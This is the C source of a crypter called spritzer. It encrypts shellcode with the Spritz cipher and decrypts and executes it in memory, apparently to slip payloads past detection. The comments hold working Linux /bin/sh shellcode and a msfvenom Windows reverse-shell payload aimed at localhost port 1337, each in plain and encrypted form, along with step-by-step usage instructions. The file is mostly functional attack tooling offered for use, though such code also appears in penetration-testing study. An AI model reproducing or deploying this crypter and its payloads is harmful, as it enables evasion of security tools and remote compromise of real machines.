/****************************************************************************
*    spritzer -- Cross platform Spritz Crypter
*                Program to encrypt payload with, or
*                to decrypt and execute payload
*                depending on the command line arguments
*                We are using the experimental SPRITZ cypher
*
*    Author    : Re4son <re4son [ at ] whitedome.com.au>
*    Doc       : http://www.whitedome.com.au/spritzer
*    Purpose   : to encrypt / decrypt&execute a shellcode
*    Platforms : Windows and Linux - both 32 and 64 bit
*
*    Compile   : Linux   = gcc spritzer.c -o spritzer
*                Windows = gcc spritzer.c -o spritzer.exe
*
*    Usage     : Encrypt         : ./spritzer <password> -e
*                Decrypt & run   : ./spritzer <password>
*
*                1. Encrypt shellcode:
*                                        - copy and paste your plaintext
*                                          shellcode below as "shellcode[]"
*                                        - compile 
*                                        - run ./spritzer <password> -e
*                                        - copy and paste the resulting
*                                          cyphertext below as "shellcode[]"
*                                        - recompile
*                                        - Done
*
*                2. Execute encrypted shellcode:
*                                        - hold on to your seats
*                                        - run ./spritzer <password>
*                                        - Done
*
*    Note      : The encryption function checks for NULL characters and
*                spits out a warning when found. Don't worry about it.
*
****************************************************************************/

#include <string.h>
#include <stdio.h>

/* TODO - copy and paste your plaintext OR encrypted shellcode here: */
const unsigned char shellcode[] = "\x0d\xa8\xdc\x43\x78\x5c\xb0\x13\x2d\xea\x00\xe0\xd2\x8a\x79\xbb\xa6\x50\xc2\x19\x01\x07\x81\xa2\x31";

//
//
/*Examples:                                                         */
/* Working Linux shellcodes:                                        */
/* execve bin/bash plaintext shellcode:
const unsigned char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
/*
/* execve bin/bash cyphertext shellcode - password "Re4son":
const unsigned char shellcode[] = "\x0d\xa8\xdc\x43\x78\x5c\xb0\x13\x2d\xea\x00\xe0\xd2\x8a\x79\xbb\xa6\x50\xc2\x19\x01\x07\x81\xa2\x31";
*/

/* Working Windows shellcodes:                                      */
/* msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=1337 -a x86 --platform Windows -f c
const unsigned char shellcode[] = "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
"\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c"
"\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
"\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68"
"\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\x7f\x00\x00\x01\x68"
"\x02\x00\x05\x39\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61"
"\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2"
"\x56\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6"
"\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01\x8d\x44"
"\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56"
"\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff"
"\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6"
"\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5";
*/
/* windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=1337 cyphertext shellcode - password "Re4son"
const unsigned char shellcode[] = "\xd8\xd0\x0e\xdb\x49\x2d\x9d\x34\xaa\xec\x5e\xdb\xef\x51\xc6"
"\xf6\x6f\x7a\xfa\xe2\x34\xe2\xe8\xfd\xc0\x39\x84\x50\x22\xae"
"\x4a\x70\xd8\xc7\x5e\x60\x2e\x73\x1a\x4f\x5f\x95\xdb\x6d\xa4"
"\xd3\x40\x2f\x71\xbd\x6b\xed\x17\xad\xe6\x5a\xc9\x1e\xae\x16"
"\x8f\xac\xda\xe3\x9c\x58\xdf\xb4\xc3\x52\x87\xad\x0a\xfe\x33"
"\xf8\xe6\x70\x5d\x61\x86\x68\x6c\xb2\x21\x4c\x33\x80\xb3\x55"
"\xf0\xae\x75\x2b\x72\xb4\xbc\x2b\x64\x82\xb1\xc9\x1c\xa1\xb8"
"\x4d\x4e\x3b\x25\xb8\xbc\x50\xe8\xd1\x5d\x50\xe6\x69\xaf\xe5"
"\x76\x18\x98\xd0\x7c\xa0\x8f\x26\x52\xcb\x84\xe7\x3d\x54\x29"
"\xb1\x90\x06\x61\x58\xa3\x74\x89\x41\x0e\xea\xf4\x52\xc7\xa5"
"\x0c\x1b\xbe\xce\x2c\x8a\x4b\xfb\x2d\x0b\xbe\x01\x16\x87\x27"
"\xfe\x21\xf9\xb1\x24\x58\x43\x8f\x44\xe1\x52\x30\xb6\x44\xf0"
"\x9b\x0e\xd0\xe5\xe5\xf9\x75\x53\x22\xf4\xa4\x93\xe9\xc8\xba"
"\x6a\x06\xe6\x1c\x83\x61\xe2\x57\x61\x30\x9e\x4e\xeb\x4f\x6b"
"\x7c\xa7\x09\x54\x6c\x5c\xee\x72\x1c\x2b\x97\x5d\xb0\xfc\xe6"
"\xff\x4f\xc5\x6e\xb3\xe0\x03\x51\xc5\x8f\x75\x97\xe9\x6a\xc9"
"\xb5\xd3\x5f\x3d\x8d\x09\x77\xaf\xea\x32\xcf\xcb\x2b\xd3\x88"
"\x58\xa5\x19\x65\x6e\x4b\x66\x91\x6e\x73\xe2\x48\x05\x85\xf2"
"\x5b\xe9\x06\xc0\x22\xc3\x98\xdc\xde\xcc\x0f\x36\x92\x57\x00"
"\xf2\x1d\xbf\x9a\x15\xa2\x36\x7c\x63\xbb\x45\x30\x7f\xaf\x15"
"\xfe\xce\x86\xfc\x05\x4f\xdc\x38\x36\x7b\x4a\x26\x78\x20\x68"
"\x4e\x13\x1f\xfc\x54\xf1\xc0\x71\xde";
*/


#define LOW(B)  ((B) & 0xf)
#define HIGH(B) ((B) >> 4)
#define ARRAY_LENGTH        256
#define ALIGNED(S) __attribute__((aligned(S)))

ALIGNED(64) typedef struct State_ {
    unsigned char s[ARRAY_LENGTH];
    unsigned char a;
    unsigned char i;
    unsigned char j;
    unsigned char k;
    unsigned char w;
    unsigned char z;
} State;


static void initialize_state(State *state)
{
    unsigned int v;

    for (v = 0; v < ARRAY_LENGTH; v++) {
        state->s[v] = (unsigned char) v;
    }
    state->a = 0;
    state->i = 0;
    state->j = 0;
    state->k = 0;
    state->w = 1;
    state->z = 0;
}

static void update(State *state)
{
    unsigned char t;
    unsigned char y;

    state->i += state->w;
    y = state->j + state->s[state->i];
    state->j = state->k + state->s[y];
    state->k = state->i + state->k + state->s[state->j];
    t = state->s[state->i];
    state->s[state->i] = state->s[state->j];
    state->s[state->j] = t;
}

static unsigned char output(State *state)
{
    const unsigned char y1 = state->z + state->k;
    const unsigned char x1 = state->i + state->s[y1];
    const unsigned char y2 = state->j + state->s[x1];

    state->z = state->s[y2];

    return state->z;
}

static void crush(State *state)
{
    unsigned char v;
    unsigned char x1;
    unsigned char x2;
    unsigned char y;

    for (v = 0; v < ARRAY_LENGTH / 2; v++) {
        y = (ARRAY_LENGTH - 1) - v;
        x1 = state->s[v];
        x2 = state->s[y];
        if (x1 > x2) {
            state->s[v] = x2;
            state->s[y] = x1;
        } else {
            state->s[v] = x1;
            state->s[y] = x2;
        }
    }
}

static void whip(State *state)
{
    const unsigned int r = ARRAY_LENGTH * 2;
    unsigned int       v;

    for (v = 0; v < r; v++) {
        update(state);
    }
    state->w += 2;
}

static void shuffle(State *state)
{
    whip(state);
    crush(state);
    whip(state);
    crush(state);
    whip(state);
    state->a = 0;
}

static void absorb_stop(State *state)
{
    if (state->a == ARRAY_LENGTH / 2) {
        shuffle(state);
    }
    state->a++;
}

static void absorb_nibble(State *state, const unsigned char x)
{
    unsigned char t;
    unsigned char y;

    if (state->a == ARRAY_LENGTH / 2) {
        shuffle(state);
    }
    y = ARRAY_LENGTH / 2 + x;
    t = state->s[state->a];
    state->s[state->a] = state->s[y];
    state->s[y] = t;
    state->a++;
}

static void absorb_byte(State *state, const unsigned char b)
{
    absorb_nibble(state, LOW(b));
    absorb_nibble(state, HIGH(b));
}

static void absorb(State *state, const unsigned char *msg, size_t length)
{
    size_t v;

    for (v = 0; v < length; v++) {
        absorb_byte(state, msg[v]);
    }
}

static unsigned char drip(State *state)
{
    if (state->a > 0) {
        shuffle(state);
    }
    update(state);

    return output(state);
}

static void squeeze(State *state, unsigned char *out, size_t outlen)
{
    size_t v;

    if (state->a > 0) {
        shuffle(state);
    }
    for (v = 0; v < outlen; v++) {
        out[v] = drip(state);
    }
}

static void memzero(void *pnt, size_t len)
{
    volatile unsigned char *pnt_ = (volatile unsigned char *) pnt;
    size_t                     i = (size_t) 0U;

    while (i < len) {
        pnt_[i++] = 0U;
    }

}

static void key_setup(State *state, const unsigned char *key, size_t keylen)
{
    initialize_state(state);
    absorb(state, key, keylen);
}

int encrypt(unsigned char *out, const unsigned char *msg, size_t msglen,
               const unsigned char *key, size_t keylen)
{
    State  state;
    size_t v;

    key_setup(&state, key, keylen);
    for (v = 0; v < msglen; v++) {
        out[v] = msg[v] + drip(&state);

    }
    memzero(&state, sizeof state);

    return 0;
}

int decrypt(unsigned char *out, const unsigned char *c, size_t clen,
               const unsigned char *key, size_t keylen)
{
    State  state;
    size_t v;

    key_setup(&state, key, keylen);
    for (v = 0; v < clen; v++) {
        out[v] = c[v] - drip(&state);
    }
    memzero(&state, sizeof state);

    return 0;
}


int main(int argc, char **argv)
{
    unsigned char       out[2048];
    unsigned char         *key;
    size_t              i, key_length;
    size_t                 shellcode_length = sizeof shellcode;
    int                 badchars = 0;
    int (*ret)() = (int(*)())out;

    if (argc == 1){
        fprintf(stderr,"Please provide a key\n");
        return -1;
    } else {
        key = (unsigned char *)argv[1];
        key_length = strlen((char *)key);
        if(key_length > ARRAY_LENGTH){
                printf("Key is too long. It should be less than 256 characters\n");
                return(-1);
        }
    }

    if (argc > 2){
        encrypt(out, shellcode, shellcode_length, key, key_length);
        for (i = 0; i < (shellcode_length-1); i++) {
            printf("\\x%02x", out[i]);
            if (out[i] == 0)
                badchars ++;
        }
        printf("\n");
        if (badchars > 0){
           printf("\n\t!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n");
            printf("\t!!              WARNING            !!\n");
            if (badchars == 1)
                printf("\t!!        Found %02d bad char        !!\n", badchars);
            else
                printf("\t!!        Found %02d bad chars       !!\n", badchars);
            printf("\t!!---------------------------------!!\n");
            printf("\t!! Please use a different password !!\n");
            printf("\t!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n\n");
         }
    } else {
           decrypt(out, shellcode, shellcode_length, key, key_length);
           ret();
    }

    return 0;
}
